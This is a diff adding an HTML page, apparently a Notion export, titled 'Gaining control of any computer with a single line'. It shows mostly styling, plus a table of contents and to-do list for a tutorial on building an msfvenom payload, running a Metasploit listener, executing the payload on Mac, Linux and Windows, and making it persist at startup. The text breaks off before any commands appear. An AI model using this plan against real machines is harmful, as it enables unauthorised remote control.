@@ -1,0 +1,889 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>Gaining control of any computer with a single line</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-opaquegray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="7e6a6ae7-a671-422b-b1ec-21681ec023de" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">⌨️</span></div><h1 class="page-title">Gaining control of any computer with a single line</h1></header><div class="page-body"><p id="17e5dbcb-e3f8-41fb-b59c-e2c874d5a786" class="">Hacking is pretty cool. </p><p id="8622434a-028a-4925-b664-52ff02584378" class="">
+</p><nav id="f79c331b-c333-4614-a86b-95cbb7ef1a51" class="block-color-gray table_of_contents"><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#7bd4d980-89c1-4951-88de-c7b5aaa6e0fb">Introduction</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#6cafcde2-e235-468e-b24e-a1885a1df038">Download and run the code with one line</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#e9102baf-525c-4c98-bcb8-9f59347f7575">Creating the payload</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#e5287ccf-0781-4550-a70b-43b5d3c46d5b">Generate using MSFVENOM</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#d845cd86-ea16-4bbf-965c-3573b6570595">What is inside the payload?</a></div><div class="table_of_contents-item table_of_contents-indent-2"><a class="table_of_contents-link" href="#5e418dea-2799-48a0-9a15-f77f51ea432e">Breaking down the payload</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#55527807-1146-409c-a68c-02e6457295b1">Running the payload</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#29e3ba89-8882-454a-bc6d-d6eed3dc3518">Start the listener</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#86d42669-c587-4a1a-a1e9-86a7f244633f">Set payload to listen to</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#bf707343-5a3a-446e-bb0f-3ca5f4cb9d57">Set IP address to listen to</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#041c1783-c35b-4c3d-8bf9-f44ecf786fd1">Set port to listen to</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#ea1be99e-3609-439f-9ada-e96758e59fb1">Start the listener</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#cffd55c5-acef-4e7f-98c4-555d3589a0f7">Running the payload on Mac/Linux</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#7703787b-31f0-4bad-926e-a76a9e26ca8a">Running the payload on Windows</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#ba76e70d-32da-4ac4-884a-2abb7b35f604">What software layer this runs on</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#698f4740-1e6c-4bb5-a0a9-2b209eab8806">Making it run on every startup</a></div><div class="table_of_contents-item table_of_contents-indent-0"><a class="table_of_contents-link" href="#3df91d14-78bc-4cb5-8189-12248faa53fa">Issues</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#c3bd9c97-37f8-4de7-b851-9e32d17eae37">Pastebin Deleted my Code</a></div><div class="table_of_contents-item table_of_contents-indent-1"><a class="table_of_contents-link" href="#6b8afec9-161d-4897-8852-c7074cd2850e">Windows scheduler errors</a></div></nav><p id="8c61997c-1dc1-4c45-880a-1fdf0353a19d" class="">
+</p><div id="c1b466ec-aa4c-4449-8dc0-c0474cf88c8a" class="collection-content"><h4 class="collection-title">To-Dpo</h4><table class="collection-content"><thead><tr><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesTitle"><path d="M7.73943662,8.6971831 C7.77640845,8.7834507 7.81338028,8.8943662 7.81338028,9.00528169 C7.81338028,9.49823944 7.40669014,9.89260563 6.91373239,9.89260563 C6.53169014,9.89260563 6.19894366,9.64612676 6.08802817,9.30105634 L5.75528169,8.33978873 L2.05809859,8.33978873 L1.72535211,9.30105634 C1.61443662,9.64612676 1.2693662,9.89260563 0.887323944,9.89260563 C0.394366197,9.89260563 0,9.49823944 0,9.00528169 C0,8.8943662 0.0246478873,8.7834507 0.0616197183,8.6971831 L2.46478873,2.48591549 C2.68661972,1.90669014 3.24119718,1.5 3.90669014,1.5 C4.55985915,1.5 5.12676056,1.90669014 5.34859155,2.48591549 L7.73943662,8.6971831 Z M2.60035211,6.82394366 L5.21302817,6.82394366 L3.90669014,3.10211268 L2.60035211,6.82394366 Z M11.3996479,3.70598592 C12.7552817,3.70598592 14,4.24823944 14,5.96126761 L14,9.07922535 C14,9.52288732 13.6549296,9.89260563 13.2112676,9.89260563 C12.8169014,9.89260563 12.471831,9.59683099 12.4225352,9.19014085 C12.028169,9.6584507 11.3257042,9.95422535 10.5492958,9.95422535 C9.60035211,9.95422535 8.47887324,9.31338028 8.47887324,7.98239437 C8.47887324,6.58978873 9.60035211,6.08450704 10.5492958,6.08450704 C11.3380282,6.08450704 12.040493,6.33098592 12.4348592,6.81161972 L12.4348592,5.98591549 C12.4348592,5.38204225 11.9172535,4.98767606 11.1285211,4.98767606 C10.6602113,4.98767606 10.2411972,5.11091549 9.80985915,5.38204225 C9.72359155,5.43133803 9.61267606,5.46830986 9.50176056,5.46830986 C9.18133803,5.46830986 8.91021127,5.1971831 8.91021127,4.86443662 C8.91021127,4.64260563 9.0334507,4.44542254 9.19366197,4.34683099 C9.87147887,3.90316901 10.6232394,3.70598592 11.3996479,3.70598592 Z M11.1778169,8.8943662 C11.6830986,8.8943662 12.1760563,8.72183099 12.4348592,8.37676056 L12.4348592,7.63732394 C12.1760563,7.29225352 11.6830986,7.11971831 11.1778169,7.11971831 C10.5616197,7.11971831 10.056338,7.45246479 10.056338,8.0193662 C10.056338,8.57394366 10.5616197,8.8943662 11.1778169,8.8943662 Z M0.65625,11.125 L13.34375,11.125 C13.7061869,11.125 14,11.4188131 14,11.78125 C14,12.1436869 13.7061869,12.4375 13.34375,12.4375 L0.65625,12.4375 C0.293813133,12.4375 4.43857149e-17,12.1436869 0,11.78125 C-4.43857149e-17,11.4188131 0.293813133,11.125 0.65625,11.125 Z"></path></svg></span>Name</th><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesPerson"><path d="M9.625,10.8465 C8.91187,10.2891 8.12088,9.926 7,9.26013 L7,8.71938 C7.21175,8.47612 7.392,8.176 7.53813,7.83213 C7.94587,7.7315 8.3125,7.33425 8.3125,7 C8.3125,6.51788 8.1095,6.32713 7.8715,6.17137 C7.8715,6.15562 7.875,6.14162 7.875,6.125 C7.875,5.41362 7.4375,3.5 5.25,3.5 C3.0625,3.5 2.625,5.4145 2.625,6.125 C2.625,6.14162 2.6285,6.15562 2.6285,6.17137 C2.3905,6.32713 2.1875,6.51788 2.1875,7 C2.1875,7.33425 2.55413,7.7315 2.96187,7.833 C3.108,8.176 3.28825,8.47612 3.5,8.71938 L3.5,9.26013 C2.37912,9.92513 1.58812,10.2882 0.875,10.8465 C0.041125,11.4984 0,12.4688 0,14 L10.5,14 C10.5,12.4688 10.4589,11.4984 9.625,10.8465 Z M13.125,7.3465 C12.4119,6.78912 11.6209,6.426 10.5,5.76013 L10.5,5.21938 C10.7118,4.97613 10.892,4.676 11.0381,4.33213 C11.4459,4.2315 11.8125,3.83425 11.8125,3.5 C11.8125,3.01787 11.6095,2.82713 11.3715,2.67138 C11.3715,2.65562 11.375,2.64162 11.375,2.625 C11.375,1.91363 10.9375,0 8.75,0 C6.5625,0 6.125,1.9145 6.125,2.625 C6.125,2.64162 6.1285,2.65562 6.1285,2.67138 C6.11188,2.68275 6.09787,2.69588 6.08125,2.70725 C7.83212,3.066 8.59688,4.54825 8.72813,5.74787 C8.97575,6.00863 9.1875,6.39625 9.1875,7 C9.1875,7.60288 8.771,8.20312 8.18388,8.51462 C8.127,8.624 8.06662,8.729 8.00275,8.82962 C8.155,8.91537 8.30025,8.99675 8.44025,9.07463 C9.08075,9.4325 9.63375,9.74137 10.164,10.1561 C10.3022,10.2638 10.4204,10.3801 10.5289,10.4991 L14,10.4991 C14,8.96875 13.9589,7.99837 13.125,7.3465 Z"></path></svg></span>Assign</th><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesSelect"><path d="M7,13 C10.31348,13 13,10.31371 13,7 C13,3.68629 10.31348,1 7,1 C3.68652,1 1,3.68629 1,7 C1,10.31371 3.68652,13 7,13 Z M3.75098,5.32278 C3.64893,5.19142 3.74268,5 3.90869,5 L10.09131,5 C10.25732,5 10.35107,5.19142 10.24902,5.32278 L7.15771,9.29703 C7.07764,9.39998 6.92236,9.39998 6.84229,9.29703 L3.75098,5.32278 Z"></path></svg></span>Status</th><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.45);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesMultipleSelect"><path d="M4,3 C4,2.447715 4.447715,2 5,2 L12,2 C12.5523,2 13,2.447716 13,3 C13,3.55228 12.5523,4 12,4 L5,4 C4.447715,4 4,3.55228 4,3 Z M4,7 C4,6.447715 4.447715,6 5,6 L12,6 C12.5523,6 13,6.447716 13,7 C13,7.55228 12.5523,8 12,8 L5,8 C4.447715,8 4,7.55228 4,7 Z M4,11 C4,10.447715 4.447715,10 5,10 L12,10 C12.5523,10 13,10.447716 13,11 C13,11.55228 12.5523,12 12,12 L5,12 C4.447715,12 4,11.55228 4,11 Z M2,4 C1.44771525,4 1,3.55228475 1,3 C1,2.44771525 1.44771525,2 2,2 C2.55228475,2 3,2.44771525 3,3 C3,3.55228475 2.55228475,4 2,4 Z M2,8 C1.44771525,8 1,7.55228475 1,7 C1,6.44771525 1.44771525,6 2,6 C2.55228475,6 3,6.44771525 3,7 C3,7.55228475 2.55228475,8 2,8 Z M2,12 C1.44771525,12 1,11.5522847 1,11 C1,10.4477153 1.44771525,10 2,10 C2.55228475,10 3,10.4477153 3,11 C3,11.5522847 2.55228475,12 2,12 Z"></path></svg></span>What</th></tr></thead><tbody><tr id="783522d4-c590-441e-a246-7e77fd676cdf"><td class="cell-title"><a href="https://www.notion.so/Card-1-783522d4c590441ea2467e77fd676cdf">Card 1</a></td><td class="cell-XmWc"></td><td class="cell-{XCA"></td><td class="cell-rt=g"></td></tr><tr id="05263f0a-25c9-4676-ade3-d716610c9244"><td class="cell-title"><a href="https://www.notion.so/Card-2-05263f0a25c94676ade3d716610c9244">Card 2</a></td><td class="cell-XmWc"></td><td class="cell-{XCA"></td><td class="cell-rt=g"></td></tr><tr id="5a21b4e2-ad1c-4744-98e2-15eb6c20ba67"><td class="cell-title"><a href="https://www.notion.so/Card-3-5a21b4e2ad1c474498e215eb6c20ba67">Card 3</a></td><td class="cell-XmWc"></td><td class="cell-{XCA"></td><td class="cell-rt=g"></td></tr><tr id="8d10dabf-a0ce-4b8c-8f97-30019abc372b"><td class="cell-title"><a href="https://www.notion.so/Download-Metasploit-Framework-8d10dabfa0ce4b8c8f9730019abc372b">Download Metasploit Framework</a></td><td class="cell-XmWc"></td><td class="cell-{XCA"><span class="selected-value select-value-color-red">Not started</span></td><td class="cell-rt=g"></td></tr><tr id="72ec50b9-61ba-4ac2-bece-4f5efbe8d846"><td class="cell-title"><a href="https://www.notion.so/Figure-out-which-port-and-ip-you-will-be-listening-on-72ec50b961ba4ac2bece4f5efbe8d846">Figure out which port and ip you will be listening on</a></td><td class="cell-XmWc"></td><td class="cell-{XCA"><span class="selected-value select-value-color-red">Not started</span></td><td class="cell-rt=g"></td></tr><tr id="3c08b382-c3a3-4af7-85f3-2a7b19140d89"><td class="cell-title"><a href="https://www.notion.so/Create-the-payload-3c08b382c3a34af785f32a7b19140d89">Create the payload</a></td><td class="cell-XmWc"></td><td class="cell-{XCA"><span class="selected-value select-value-color-red">Not started</span></td><td class="cell-rt=g"></td></tr><tr id="6388704f-6d04-4eb7-93bb-1561a20b788c"><td class="cell-title"><a href="https://www.notion.so/Setup-the-listener-6388704f6d044eb793bb1561a20b788c">Setup the listener</a></td><td class="cell-XmWc"></td><td class="cell-{XCA"><span class="selected-value select-value-color-red">Not started</span></td><td class="cell-rt=g"></td></tr></tbody></table></div><h1 id="7bd4d980-89c1-4951-88de-c7b5aaa6e0fb" class="">Introduction</h1><p 